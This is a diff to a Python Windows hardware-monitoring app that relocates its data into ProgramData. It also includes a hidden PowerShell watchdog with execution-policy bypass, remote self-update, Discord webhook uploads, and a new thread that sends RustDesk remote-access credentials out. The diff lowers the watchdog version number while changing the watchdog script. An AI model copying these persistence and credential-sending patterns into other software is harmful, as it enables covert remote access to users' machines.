@@ -40,7 +40,7 @@ SETUP
   event log, foreground app) logs fine with no extra downloads.
 
 RUN
-  First launch (no config next to this file yet) automatically runs
+  First launch (no PC Monitor data/config yet) automatically runs
   the guided installer below, then marks itself done so every launch
   after that goes straight to the GUI - including the copy the
   installer places in your Start Menu, which starts out already
@@ -63,8 +63,9 @@ RUN
   sure?" confirmation rather than silently exiting either way.
 
 LOGS
-  Written to a "pc_monitor_logs" folder next to this script, unless
-  the installer (or pcmonitor_config.json) set a custom location.
+  Written by default to %ProgramData%\\PCMonitorRemote\\logs. The Python payload
+  can live in Downloads or anywhere else without the app creating runtime files there;
+  a custom logs location can still be selected explicitly.
   Each file caps at 10 MB, then a new timestamped file starts.
   Total logs folder caps at 1.5 GB - oldest files are deleted first.
   The History tab reads across however many files a chosen time range
@@ -73,8 +74,8 @@ LOGS
 INSTALL
   Runs by itself on first launch (see RUN above). What it does:
   installs the pip packages above, lets you pick a logs folder and
-  (optionally) a PresentMon path, places a copy of this same file in
-  your Start Menu, creates a shortcut, and can enable launch-at-login.
+  (optionally) a PresentMon path, installs the persistent app under %ProgramData%\\PCMonitorRemote, creates
+  Start Menu/Startup shortcuts, deploys the watchdog there, and can enable launch-at-login.
   Everything asks before it does anything.
 
 PERFORMANCE
@@ -98,6 +99,7 @@ import queue
 import re
 import subprocess
 import sys
+sys.dont_write_bytecode = True
 import threading
 import time
 import tkinter as tk
@@ -145,7 +147,23 @@ CREATE_NEW_CONSOLE = getattr(subprocess, "CREATE_NEW_CONSOLE", 0)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
-APP_VERSION = "3.2"
+# All runtime-generated PC Monitor files live in one machine-wide data
+# directory.  This is deliberately NOT SCRIPT_DIR: the launcher/update copy
+# may be sitting in Downloads (or another arbitrary folder), and the app must
+# never litter that folder with configs, watchdog scripts, logs, .new/.bak
+# files, heartbeat markers, crash reports, tools, or temporary installers.
+# The downloaded/installed Python file is only the executable payload; all
+# mutable state belongs under ProgramData.
+_PROGRAMDATA_ROOT = os.environ.get("PROGRAMDATA") or os.environ.get("LOCALAPPDATA") or SCRIPT_DIR
+APP_DATA_DIR = os.path.join(_PROGRAMDATA_ROOT, "PCMonitorRemote")
+APP_LOGS_DIR = os.path.join(APP_DATA_DIR, "logs")
+APP_TOOLS_DIR = os.path.join(APP_DATA_DIR, "tools")
+APP_UPDATES_DIR = os.path.join(APP_DATA_DIR, "updates")
+APP_EXPORTS_DIR = os.path.join(APP_DATA_DIR, "exports")
+APP_CRASH_DIR = os.path.join(APP_DATA_DIR, "crash_dumps")
+APP_PATH = os.path.join(APP_DATA_DIR, "pc_monitor.py")
+
+APP_VERSION = "3.4"
 
 # The external watchdog is a PowerShell script CARRIED INSIDE this file and
 # written to disk at setup. It runs as a Scheduled Task independently of
@@ -155,26 +173,32 @@ APP_VERSION = "3.2"
 # watchdog version to WATCHDOG_VERSION and rewrites the .ps1 when this file
 # (pulled by the watchdog) carries a newer one. Bump WATCHDOG_VERSION whenever
 # WATCHDOG_PS1 changes so deployed copies refresh.
-WATCHDOG_VERSION = "17"
+WATCHDOG_VERSION = "16"
 WATCHDOG_PS1 = r'''# PC Monitor watchdog (auto-generated from pc_monitor.py - do not edit;
 # it is overwritten from the app's embedded copy whenever this app deploys.
 $ErrorActionPreference = 'SilentlyContinue'
+# ALL mutable PC Monitor state lives under ProgramData. The watchdog can be
+# launched from anywhere; only the Python payload path is resolved from its
+# own folder as a fallback. This keeps Downloads/Desktop completely clean.
 $dir = Split-Path -Parent $MyInvocation.MyCommand.Definition
-$cfgPath = Join-Path $dir 'pcmonitor_config.json'
+$dataDir = Join-Path $env:ProgramData 'PCMonitorRemote'
+New-Item -ItemType Directory -Path $dataDir -Force | Out-Null
+$cfgPath = Join-Path $dataDir 'pcmonitor_config.json'
 if (-not (Test-Path $cfgPath)) { exit }
 try { $cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json } catch { exit }
 
-$script  = Join-Path $dir 'pc_monitor.py'
-$hb      = Join-Path $dir 'pcmonitor_heartbeat.json'
-$exitReq = Join-Path $dir 'pcmonitor_exit_request'
+$script  = Join-Path $dataDir 'pc_monitor.py'
+if (-not (Test-Path $script)) { $script = Join-Path $dir 'pc_monitor.py' }
+$hb      = Join-Path $dataDir 'pcmonitor_heartbeat.json'
+$exitReq = Join-Path $dataDir 'pcmonitor_exit_request'
 $py  = if ($cfg.python_exe) { $cfg.python_exe } else { 'pythonw' }
 $pyc = if ($cfg.python_console_exe) { $cfg.python_console_exe } else { 'python' }
 $hook    = $cfg.discord_webhook_url
 $url     = $cfg.update_url
 $machine = if ($cfg.machine_label) { $cfg.machine_label } else { $env:COMPUTERNAME }
 $stale   = 180
-$stateFile = Join-Path $dir 'pcmonitor_watchdog_state.json'
-$watchdogLog = Join-Path $dir 'pcmonitor_watchdog.log'
+$stateFile = Join-Path $dataDir 'pcmonitor_watchdog_state.json'
+$watchdogLog = Join-Path $dataDir 'pcmonitor_watchdog.log'
 
 function Log($msg) {
   try { Add-Content -Path $watchdogLog -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' ' + $msg) } catch {}
@@ -213,7 +237,7 @@ function LaunchApp() {
 }
 
 $updated = $false
-Log("WATCHDOG v13 start pid=$PID")
+Log("WATCHDOG v15 start pid=$PID")
 
 # 1) update: if the hosted APP_VERSION is newer, cleanly stop the app, replace
 # the file (validated with py_compile), relaunch, and notify.
@@ -298,7 +322,8 @@ sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File 
 # read a fixed bogus value forever, e.g. a constant 104C phantom) - matched
 # so they can be kept in the raw log but excluded from decision logic
 _PHANTOM_SENSOR_RE = re.compile(r"(temperature|voltage|fan|current|power)\s*#?\s*\d+\s*$", re.I)
-CONFIG_PATH = os.path.join(SCRIPT_DIR, "pcmonitor_config.json")
+CONFIG_PATH = os.path.join(APP_DATA_DIR, "pcmonitor_config.json")
+LEGACY_CONFIG_PATH = os.path.join(SCRIPT_DIR, "pcmonitor_config.json")
 
 # External-watchdog coordination files (all next to the script, so the
 # watchdog running the same file with --watchdog finds them):
@@ -307,8 +332,8 @@ CONFIG_PATH = os.path.join(SCRIPT_DIR, "pcmonitor_config.json")
 #    "crashed/killed" from "closed on purpose".
 #  - exit-request: the watchdog drops this to ask the running app to shut
 #    down cleanly (for an update) rather than being force-killed.
-HEARTBEAT_FILE = os.path.join(SCRIPT_DIR, "pcmonitor_heartbeat.json")
-EXIT_REQUEST_FILE = os.path.join(SCRIPT_DIR, "pcmonitor_exit_request")
+HEARTBEAT_FILE = os.path.join(APP_DATA_DIR, "pcmonitor_heartbeat.json")
+EXIT_REQUEST_FILE = os.path.join(APP_DATA_DIR, "pcmonitor_exit_request")
 HEARTBEAT_STALE_SECONDS = 180  # heartbeat older than this => app is gone
 DEFAULT_CONFIG = {"logs_dir": None, "presentmon_path": None, "ping_host": "1.1.1.1",
                    "lhm_web_port": 8085, "setup_complete": False,
@@ -336,11 +361,11 @@ DEFAULT_CONFIG = {"logs_dir": None, "presentmon_path": None, "ping_host": "1.1.1
                    # sample counts map to different real durations - #10)
                    "gpu_stall_flag_seconds": 3.0,
                    "gpu_stall_recover_seconds": 5.0,
-                   # write a plain-text crash report to the Desktop on the next
+                   # write a plain-text crash report under APP_CRASH_DIR on the next
                    # launch after a session that didn't shut down cleanly
-                   "crash_dump_to_desktop": True,
+                   "crash_dump_to_desktop": True,  # legacy setting name; reports now stay in APP_CRASH_DIR
                    # also dump the last N MB of RAW log data (the telemetry
-                   # leading up to the crash, across rotated files) to Desktop
+                   # leading up to the crash, across rotated files) under APP_CRASH_DIR
                    "crash_dump_last_mb": 10,
                    # optional: POST the crash report + data to a Discord webhook
                    # so crashes come to you automatically (leave blank to disable)
@@ -370,18 +395,30 @@ DEFAULT_CONFIG = {"logs_dir": None, "presentmon_path": None, "ping_host": "1.1.1
 
 
 def _load_config():
-    """Reads an optional pcmonitor_config.json (written by the installer,
-    or by the app itself when you use "Locate PresentMon.exe") so a
-    custom log location / PresentMon path survive reinstalls. Falls
-    back to sensible defaults if there's no config."""
+    """Load the machine-wide config.
+
+    Older builds stored config beside the Python file, which meant a copy
+    launched from Downloads created support files there.  Prefer the new
+    ProgramData config, but read the old config once so existing installs do
+    not lose their settings; migration is completed after CONFIG is created.
+    """
     cfg = dict(DEFAULT_CONFIG)
-    try:
-        with open(CONFIG_PATH, "r") as f:
-            cfg.update(json.load(f))
-    except (FileNotFoundError, json.JSONDecodeError, OSError):
-        pass
-    if not cfg.get("logs_dir"):
-        cfg["logs_dir"] = os.path.join(SCRIPT_DIR, "pc_monitor_logs")
+    loaded_from_legacy = False
+    for path in (CONFIG_PATH, LEGACY_CONFIG_PATH):
+        if path == LEGACY_CONFIG_PATH and os.path.normcase(path) == os.path.normcase(CONFIG_PATH):
+            continue
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                cfg.update(json.load(f))
+            loaded_from_legacy = (path == LEGACY_CONFIG_PATH)
+            if path == CONFIG_PATH:
+                loaded_from_legacy = False
+                break
+        except (FileNotFoundError, json.JSONDecodeError, OSError):
+            continue
+    if not cfg.get("logs_dir") or (loaded_from_legacy and os.path.normcase(str(cfg.get("logs_dir"))) == os.path.normcase(os.path.join(SCRIPT_DIR, "pc_monitor_logs"))):
+        cfg["logs_dir"] = APP_LOGS_DIR
+    cfg["_legacy_config_loaded"] = loaded_from_legacy
     return cfg
 
 
@@ -424,7 +461,101 @@ def _set_config(key, value):
 
 CONFIG = _load_config()
 LOGS_DIR = CONFIG["logs_dir"]
-TOOLS_DIR = os.path.join(SCRIPT_DIR, "tools")
+TOOLS_DIR = APP_TOOLS_DIR
+
+
+def _migrate_legacy_runtime_files():
+    """Move support files left beside an older copy into APP_DATA_DIR.
+
+    Never moves/deletes the user's actual Python payload.  This is specifically
+    for the files previous builds generated beside the script (especially in
+    Downloads).  Existing files in the central location win; legacy files are
+    only copied/moved when the destination does not already exist.
+    """
+    if os.path.normcase(SCRIPT_DIR) == os.path.normcase(APP_DATA_DIR):
+        return
+    try:
+        os.makedirs(APP_DATA_DIR, exist_ok=True)
+        os.makedirs(APP_LOGS_DIR, exist_ok=True)
+        os.makedirs(APP_TOOLS_DIR, exist_ok=True)
+        os.makedirs(APP_UPDATES_DIR, exist_ok=True)
+        os.makedirs(APP_EXPORTS_DIR, exist_ok=True)
+        os.makedirs(APP_CRASH_DIR, exist_ok=True)
+        import shutil
+        legacy_files = [
+            "pcmonitor_config.json", "pcmonitor_heartbeat.json",
+            "pcmonitor_exit_request", "pcmonitor_watchdog.ps1",
+            "pcmonitor_watchdog.ver", "pcmonitor_watchdog_launch.vbs",
+            "pcmonitor_watchdog_state.json", "pcmonitor_watchdog.log",
+            "pc_monitor_crash.log", ".pcmon_lastupdate",
+        ]
+        for name in legacy_files:
+            src = os.path.join(SCRIPT_DIR, name)
+            dst = os.path.join(APP_DATA_DIR, name)
+            if os.path.isfile(src):
+                if not os.path.exists(dst):
+                    try:
+                        shutil.move(src, dst)
+                    except OSError:
+                        try:
+                            shutil.copy2(src, dst)
+                        except OSError:
+                            pass
+                else:
+                    try:
+                        os.remove(src)
+                    except OSError:
+                        pass
+        # Previous updaters could leave these beside the downloaded script.
+        # Move only PC Monitor's known transient/backup names; never touch the
+        # actual source .py or unrelated files in the user's Downloads folder.
+        for name in ("pc_monitor.py.new", "pc_monitor.py.bak", "pc_monitor.py.tmp",
+                     "pcmonitor_config.json.tmp", "pcmonitor_watchdog_state.json.tmp",
+                     "pcmonitor_watchdog.ps1.tmp", "pcmonitor_watchdog.ver.tmp",
+                     "pcmonitor_watchdog_launch.vbs.tmp", ".pcmon_lastupdate.tmp"):
+            src = os.path.join(SCRIPT_DIR, name)
+            dst = os.path.join(APP_UPDATES_DIR, name)
+            if os.path.isfile(src):
+                if not os.path.exists(dst):
+                    try:
+                        shutil.move(src, dst)
+                    except OSError:
+                        pass
+                else:
+                    try:
+                        os.remove(src)
+                    except OSError:
+                        pass
+        legacy_log_dir = os.path.join(SCRIPT_DIR, "pc_monitor_logs")
+        if os.path.isdir(legacy_log_dir) and os.path.normcase(legacy_log_dir) != os.path.normcase(LOGS_DIR):
+            os.makedirs(LOGS_DIR, exist_ok=True)
+            for name in os.listdir(legacy_log_dir):
+                src = os.path.join(legacy_log_dir, name)
+                dst = os.path.join(LOGS_DIR, name)
+                if os.path.isfile(src):
+                    if not os.path.exists(dst):
+                        try:
+                            shutil.move(src, dst)
+                        except OSError:
+                            pass
+                    else:
+                        try:
+                            os.remove(src)
+                        except OSError:
+                            pass
+            try:
+                if not os.listdir(legacy_log_dir):
+                    os.rmdir(legacy_log_dir)
+            except OSError:
+                pass
+        # Persist the migrated config without the internal migration marker.
+        if CONFIG.pop("_legacy_config_loaded", False) or not os.path.exists(CONFIG_PATH):
+            _atomic_write_json(CONFIG_PATH, CONFIG)
+    except Exception:
+        CONFIG.pop("_legacy_config_loaded", None)
+
+
+_migrate_legacy_runtime_files()
 MAX_FILE_BYTES = 10 * 1024 * 1024
 MAX_TOTAL_BYTES = int(1.5 * 1024**3)
 
@@ -2929,14 +3060,15 @@ def previous_session_driver(logs_dir, current_path=None):
 
 def dump_crash_data_to_desktop(logs_dir, last_ts, max_bytes=10 * 1024 * 1024):
     """Preserve the RAW telemetry leading up to the crash: the last
-    `max_bytes` of log data across rotated files, written to the Desktop as
+    `max_bytes` of log data across rotated files, written under APP_CRASH_DIR as
     pc_crash_{date-time}_last{N}mb.jsonl. The full picture (every sensor,
     every poll), not just the analysis - so nothing is lost even if logs
     later rotate away. Deduped by crash time."""
     stamp = (last_ts or datetime.now().isoformat(timespec="seconds"))
     stamp = stamp.replace(":", "").replace("-", "").replace("T", "_")[:15]
     mb = max(1, int(max_bytes / (1024 * 1024)))
-    out = os.path.join(_desktop_dir(), f"pc_crash_{stamp}_last{mb}mb.jsonl")
+    os.makedirs(APP_CRASH_DIR, exist_ok=True)
+    out = os.path.join(APP_CRASH_DIR, f"pc_crash_{stamp}_last{mb}mb.jsonl")
     if os.path.exists(out):
         return out
     try:
@@ -3022,17 +3154,18 @@ def post_crash_to_discord(webhook_url, content, files):
 
 
 def export_diagnostics_zip(logs_dir, dest_dir=None, recent=3):
-    """Bundle the recent logs + any crash reports + a fresh inventory into a
-    single zip to send for support."""
+    """Bundle the recent logs + any crash reports + a fresh inventory into the
+    central APP_EXPORTS_DIR unless the caller explicitly chooses a destination."""
     import zipfile
     label = (CONFIG.get("machine_label") or "").strip() or "pc"
     label = re.sub(r"[^A-Za-z0-9_-]+", "_", label)
     stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    dest_dir = dest_dir or _desktop_dir()
+    dest_dir = dest_dir or APP_EXPORTS_DIR
+    os.makedirs(dest_dir, exist_ok=True)
     out = os.path.join(dest_dir, f"pcmonitor_diag_{label}_{stamp}.zip")
     try:
         logs = sorted(glob.glob(os.path.join(logs_dir, "pc_monitor_*.jsonl")))[-recent:]
-        reports = glob.glob(os.path.join(_desktop_dir(), "pc_crash_*.txt"))
+        reports = glob.glob(os.path.join(APP_CRASH_DIR, "pc_crash_*.txt"))
         with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
             for f in logs:
                 z.write(f, os.path.basename(f))
@@ -3051,7 +3184,7 @@ def export_app_logs_zip(logs_dir, dest_path=None, max_log_mb=40):
     """Export useful PC Monitor/watchdog/remote logs without exporting the
     RustDesk state file that contains the saved password."""
     import zipfile
-    dest_dir = os.path.dirname(dest_path) if dest_path else _desktop_dir()
+    dest_dir = os.path.dirname(dest_path) if dest_path else APP_EXPORTS_DIR
     os.makedirs(dest_dir, exist_ok=True)
     if not dest_path:
         dest_path = os.path.join(dest_dir, f"pcmonitor_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
@@ -3059,9 +3192,9 @@ def export_app_logs_zip(logs_dir, dest_path=None, max_log_mb=40):
     for pattern in (
         os.path.join(logs_dir, "pc_monitor_*.jsonl"),
         os.path.join(logs_dir, "pcmonitor_*.log"),
-        os.path.join(SCRIPT_DIR, "pc_monitor_crash.log"),
-        os.path.join(SCRIPT_DIR, "pcmonitor_watchdog.log"),
-        os.path.join(SCRIPT_DIR, "pcmonitor_watchdog.ps1"),
+        os.path.join(APP_DATA_DIR, "pc_monitor_crash.log"),
+        os.path.join(APP_DATA_DIR, "pcmonitor_watchdog.log"),
+        os.path.join(APP_DATA_DIR, "pcmonitor_watchdog.ps1"),
         REMOTE_LOG_PATH,
     ):
         candidates.extend(glob.glob(pattern))
@@ -3075,7 +3208,7 @@ def export_app_logs_zip(logs_dir, dest_path=None, max_log_mb=40):
                     size = os.path.getsize(path)
                     if path.lower().endswith(".jsonl") and total + size > cap:
                         continue
-                    z.write(path, os.path.relpath(path, SCRIPT_DIR))
+                    z.write(path, os.path.relpath(path, APP_DATA_DIR))
                     if path.lower().endswith(".jsonl"):
                         total += size
                 except OSError:
@@ -3089,14 +3222,15 @@ def export_app_logs_zip(logs_dir, dest_path=None, max_log_mb=40):
 
 
 def write_crash_report_to_desktop(path, last_ts, win_events=None, accel=None, analysis=None):
-    """On the first launch after a crash, drop a plain-text report on the
-    Desktop named pc_crash_{date-time}. Deduped by the crash's timestamp,
+    """On the first launch after a crash, drop a plain-text report under
+    APP_CRASH_DIR named pc_crash_{date-time}. Deduped by the crash's timestamp,
     so relaunching before a clean exit won't spam duplicates. Includes the
     auto-grabbed Windows event log entries and crash-acceleration note when
     provided. Returns the report path, or None."""
     stamp = (last_ts or datetime.now().isoformat(timespec="seconds"))
     stamp = stamp.replace(":", "").replace("-", "").replace("T", "_")[:15]
-    out = os.path.join(_desktop_dir(), f"pc_crash_{stamp}.txt")
+    os.makedirs(APP_CRASH_DIR, exist_ok=True)
+    out = os.path.join(APP_CRASH_DIR, f"pc_crash_{stamp}.txt")
     if os.path.exists(out):
         return out  # already dumped for this crash
     a = analysis or analyze_crash(path)
@@ -3652,11 +3786,18 @@ class App(tk.Tk):
         # carry a newer embedded watchdog - redeploy it. Background so it never
         # delays the window.
         threading.Thread(
-            target=lambda: sync_watchdog(SCRIPT_DIR, os.path.abspath(__file__)),
+            target=lambda: sync_watchdog(APP_DATA_DIR, APP_PATH),
             daemon=True).start()
         threading.Thread(
             target=_ensure_remote_host_async,
             kwargs={"wait": False},
+            daemon=True).start()
+        # Credential delivery is independent of the RustDesk setup thread.
+        # Existing credentials can be sent without elevation, and first-time
+        # credentials are sent as soon as the setup thread creates state.json.
+        threading.Thread(
+            target=_remote_credential_delivery_worker,
+            name="RemoteCredentialDelivery",
             daemon=True).start()
 
         # lifecycle: announce we're up (PC restart, or relaunched after being
@@ -3827,7 +3968,7 @@ class App(tk.Tk):
                 msg += (f"  Auto-grabbed {len(win_events)} Windows event(s) around the "
                         "crash - shown in the Events tab.")
             if out:
-                msg += f"  Report on Desktop: {os.path.basename(out)}."
+                msg += f"  Report saved in PC Monitor data: {os.path.basename(out)}."
             if data_path:
                 msg += f"  Raw data: {os.path.basename(data_path)}."
             if discord_status:
@@ -4260,7 +4401,7 @@ class App(tk.Tk):
             messagebox.showinfo("Remote log", REMOTE_LOG_PATH)
 
     def _export_app_logs(self):
-        default = os.path.join(_desktop_dir(), f"pcmonitor_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
+        default = os.path.join(APP_EXPORTS_DIR, f"pcmonitor_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
         path = filedialog.asksaveasfilename(title="Export PC Monitor logs", initialfile=os.path.basename(default), initialdir=os.path.dirname(default), defaultextension=".zip", filetypes=[("ZIP archive", "*.zip")])
         if not path: return
         def worker():
@@ -4271,7 +4412,7 @@ class App(tk.Tk):
     def _send_app_logs_to_discord(self):
         self.remote_status_lbl.config(text="Building app-log bundle for Discord...")
         def worker():
-            tmp = os.path.join(os.environ.get("TEMP", _desktop_dir()), f"pcmonitor_logs_{os.getpid()}_{int(time.time())}.zip")
+            tmp = os.path.join(APP_EXPORTS_DIR, f"pcmonitor_logs_{os.getpid()}_{int(time.time())}.zip")
             out = export_app_logs_zip(LOGS_DIR, tmp, max_log_mb=18)
             ok = False; detail = "bundle creation failed"
             if out:
@@ -5047,11 +5188,11 @@ class App(tk.Tk):
         re-registered tasks) and report what's actually deployed - so a stuck
         auto-update chain can be fixed with one click instead of a reinstall."""
         def worker():
-            ok = deploy_watchdog(SCRIPT_DIR, os.path.abspath(__file__))
+            ok = deploy_watchdog(APP_DATA_DIR, APP_PATH)
             # read back what's on disk / registered so the user can verify
             ver = "(none)"
             try:
-                _, ver_path, _ = _watchdog_paths(SCRIPT_DIR)
+                _, ver_path, _ = _watchdog_paths(APP_DATA_DIR)
                 if os.path.exists(ver_path):
                     ver = open(ver_path, encoding="utf-8").read().strip()
             except Exception:
@@ -5073,7 +5214,7 @@ class App(tk.Tk):
                     f"Scheduled task: {task}\n"
                     f"Webhook: {hook}\n"
                     f"Update URL: {url}\n\n"
-                    f"Folder: {SCRIPT_DIR}\n"
+                    f"Folder: {APP_DATA_DIR}\n"
                     "If PowerShell still flashes, delete any extra PCMonitor* tasks "
                     "in Task Scheduler - an old one may still run powershell directly.")
             self.after(0, done)
@@ -5341,8 +5482,7 @@ def find_console_python():
 
 def choose_logs_dir():
     step("Log file location")
-    default = os.path.join(os.environ.get("LOCALAPPDATA", SCRIPT_DIR),
-                            "PCMonitor", "logs")
+    default = APP_LOGS_DIR
     path = ask_path("Where should log files be stored?", default)
     os.makedirs(path, exist_ok=True)
     print(f"Logs will be written to: {path}")
@@ -5377,45 +5517,49 @@ def choose_presentmon_path():
 
 
 def install_clone(logs_dir, extra_config=None):
-    step("Installing to your Start Menu")
+    """Install the actual runnable payload under ProgramData.
+
+    The original file can be launched from Downloads, a USB stick, etc.
+    That location is treated as an input/source only.  The persistent app,
+    config, watchdog, logs, tools, update staging, and crash state all live
+    under APP_DATA_DIR so the source folder stays clean.
+    """
+    step("Installing PC Monitor")
     if not os.path.exists(SOURCE_APP):
-        print(f"Can't find this script at {SOURCE_APP} - something odd "
-              "happened to the file path. Try re-running it.")
+        print(f"Can't find this script at {SOURCE_APP} - something odd happened to the file path. Try re-running it.")
         sys.exit(1)
 
-    start_menu = os.path.join(
-        os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu",
-        "Programs", "PC Monitor")
-    os.makedirs(start_menu, exist_ok=True)
-    clone_path = os.path.join(start_menu, "pc_monitor.py")
+    os.makedirs(APP_DATA_DIR, exist_ok=True)
+    os.makedirs(APP_LOGS_DIR, exist_ok=True)
+    os.makedirs(APP_TOOLS_DIR, exist_ok=True)
+    os.makedirs(APP_UPDATES_DIR, exist_ok=True)
+    os.makedirs(APP_EXPORTS_DIR, exist_ok=True)
+    os.makedirs(APP_CRASH_DIR, exist_ok=True)
 
-    with open(SOURCE_APP, "rb") as src, open(clone_path, "wb") as dst:
+    clone_path = APP_PATH
+    tmp_clone = os.path.join(APP_UPDATES_DIR, "pc_monitor.installing")
+    with open(SOURCE_APP, "rb") as src, open(tmp_clone, "wb") as dst:
         dst.write(src.read())
+    os.replace(tmp_clone, clone_path)
 
-    # Write the FULL effective config to the clone, not just a couple keys -
-    # the PowerShell watchdog reads this JSON directly and needs update_url,
-    # discord_webhook_url, machine_label, etc. (it can't see Python's
-    # in-memory DEFAULT_CONFIG).
     cfg = dict(CONFIG)
-    cfg["logs_dir"] = logs_dir
+    cfg["logs_dir"] = logs_dir or APP_LOGS_DIR
     cfg["setup_complete"] = True
     if extra_config:
         cfg.update(extra_config)
-    with open(os.path.join(start_menu, "pcmonitor_config.json"), "w", encoding="utf-8") as f:
-        json.dump(cfg, f, indent=2)
+    _atomic_write_json(CONFIG_PATH, cfg)
 
     print(f"Installed to: {clone_path}")
+    print(f"All PC Monitor runtime files: {APP_DATA_DIR}")
     print("It'll already show up if you search \"PC Monitor\" in the Start Menu.")
-    # deploy the PowerShell watchdog next to the clone + register its task
+
     if CONFIG.get("watchdog_enabled", True):
         try:
-            if deploy_watchdog(start_menu, clone_path):
-                print("Watchdog deployed (PowerShell; on login + every "
-                      "1 min).")
-        except Exception:
-            pass
-    # #5: start the main app on login via a Startup-folder shortcut (the
-    # watchdog does NOT start it - only relaunches after an update)
+            if deploy_watchdog(APP_DATA_DIR, clone_path):
+                print("Watchdog deployed (PowerShell; on login + every 1 min).")
+        except Exception as e:
+            print(f"Watchdog deployment failed: {e}")
+
     if create_startup_shortcut(clone_path):
         print("Added to Startup - it'll launch automatically when you log in.")
     return clone_path
@@ -5625,7 +5769,7 @@ def _version_tuple(v):
 def _update_due(interval_hours):
     """Throttle so we don't hit the network every single launch. Records
     the last check time in a small file next to the script."""
-    stamp = os.path.join(SCRIPT_DIR, ".pcmon_lastupdate")
+    stamp = os.path.join(APP_DATA_DIR, ".pcmon_lastupdate")
     try:
         last = float(open(stamp).read().strip())
         if time.time() - last < max(0, interval_hours) * 3600:
@@ -5672,8 +5816,8 @@ def check_and_apply_update():
     remote_ver = m.group(1)
     if _version_tuple(remote_ver) <= _version_tuple(APP_VERSION):
         return None
-    target = os.path.abspath(__file__)
-    update_dir = os.path.join(os.environ.get("PROGRAMDATA", SCRIPT_DIR), "PCMonitorRemote", "updates")
+    target = APP_PATH if os.path.exists(APP_PATH) else os.path.abspath(__file__)
+    update_dir = APP_UPDATES_DIR
     tmp = os.path.join(update_dir, os.path.basename(target) + ".new")
     bak = os.path.join(update_dir, os.path.basename(target) + ".bak")
     try:
@@ -5722,7 +5866,7 @@ def _maybe_self_update():
     if not CONFIG.get("auto_update_restart", True):
         return  # applied; will run on next launch
     try:
-        subprocess.Popen([sys.executable, os.path.abspath(__file__), "--no-update"]
+        subprocess.Popen([sys.executable, APP_PATH if os.path.exists(APP_PATH) else os.path.abspath(__file__), "--no-update"]
                          + [a for a in sys.argv[1:] if a != "--no-update"])
     except Exception:
         return
@@ -5806,7 +5950,7 @@ def _launch_main_app():
     """Spawn the normal (GUI) instance of this same file, detached so it
     outlives the short-lived watchdog process."""
     try:
-        target = os.path.abspath(__file__)
+        target = APP_PATH if os.path.exists(APP_PATH) else os.path.abspath(__file__)
         py = find_pythonw() or sys.executable
         flags = (getattr(subprocess, "DETACHED_PROCESS", 0)
                  | getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0))
@@ -5880,8 +6024,10 @@ def _watchdog_update():
         except OSError:
             pass
     # replace the file (validated + backed up, same rules as check_and_apply_update)
-    target = os.path.abspath(__file__)
-    tmp = target + ".new"
+    target = APP_PATH if os.path.exists(APP_PATH) else os.path.abspath(__file__)
+    os.makedirs(APP_UPDATES_DIR, exist_ok=True)
+    tmp = os.path.join(APP_UPDATES_DIR, os.path.basename(target) + ".new")
+    bak = os.path.join(APP_UPDATES_DIR, os.path.basename(target) + ".bak")
     try:
         import py_compile
         import shutil
@@ -5889,7 +6035,7 @@ def _watchdog_update():
             f.write(remote)
         py_compile.compile(tmp, doraise=True)
         try:
-            shutil.copy2(target, target + ".bak")
+            shutil.copy2(target, bak)
         except Exception:
             pass
         os.replace(tmp, target)
@@ -5912,7 +6058,7 @@ def run_watchdog():
     except Exception:
         pass
     try:
-        state_file = os.path.join(SCRIPT_DIR, "pcmonitor_watchdog_state.json")
+        state_file = os.path.join(APP_DATA_DIR, "pcmonitor_watchdog_state.json")
         prev_running = False
         try:
             with open(state_file, encoding="utf-8") as f:
@@ -5939,10 +6085,14 @@ def run_watchdog():
         pass
 
 
-def _watchdog_paths(script_dir):
-    return (os.path.join(script_dir, "pcmonitor_watchdog.ps1"),
-            os.path.join(script_dir, "pcmonitor_watchdog.ver"),
-            os.path.join(script_dir, "pcmonitor_config.json"))
+def _watchdog_paths(script_dir=None):
+    # Watchdog/config files are machine state, never files beside the running
+    # Python payload.  Keeping them in ProgramData prevents Downloads (or a
+    # Start Menu folder) from accumulating mutable support files.
+    os.makedirs(APP_DATA_DIR, exist_ok=True)
+    return (os.path.join(APP_DATA_DIR, "pcmonitor_watchdog.ps1"),
+            os.path.join(APP_DATA_DIR, "pcmonitor_watchdog.ver"),
+            os.path.join(APP_DATA_DIR, "pcmonitor_config.json"))
 
 
 def deploy_watchdog(script_dir, script_path=None):
@@ -5971,7 +6121,7 @@ def deploy_watchdog(script_dir, script_path=None):
         # write the watchdog + a windowless VBScript launcher + version stamp
         with open(ps1_path, "w", encoding="utf-8") as f:
             f.write(WATCHDOG_PS1)
-        vbs_path = os.path.join(script_dir, "pcmonitor_watchdog_launch.vbs")
+        vbs_path = os.path.join(APP_DATA_DIR, "pcmonitor_watchdog_launch.vbs")
         with open(vbs_path, "w", encoding="utf-8") as f:
             f.write(WATCHDOG_VBS)
         with open(ver_path, "w", encoding="utf-8") as f:
@@ -6102,8 +6252,7 @@ def _legacy_sync_watchdog_unused(script_dir, script_path=None):
 
 def register_watchdog_task(script_path=None):
     """Create/refresh the Scheduled Task that runs the watchdog every 1 minute.
-    Points at script_path (the persistent Start Menu clone), not necessarily
-    the file currently executing."""
+    Points at the persistent ProgramData app when available."""
     if not CONFIG.get("watchdog_enabled", True):
         return False
     try:
@@ -6120,9 +6269,10 @@ def register_watchdog_task(script_path=None):
 
 
 def _crash_log_path():
-    """Next to the running script/config, so a silent startup death leaves
-    a readable trail even when running under pythonw.exe (no console)."""
-    return os.path.join(SCRIPT_DIR, "pc_monitor_crash.log")
+    """Store the fatal-startup trail in the central app-data directory so a
+    silent startup death leaves a readable trail even under pythonw.exe."""
+    os.makedirs(APP_DATA_DIR, exist_ok=True)
+    return os.path.join(APP_DATA_DIR, "pc_monitor_crash.log")
 
 
 def _log_fatal(text):
@@ -6296,8 +6446,11 @@ def _remote_notify_ready(state, force=False, reason="setup"):
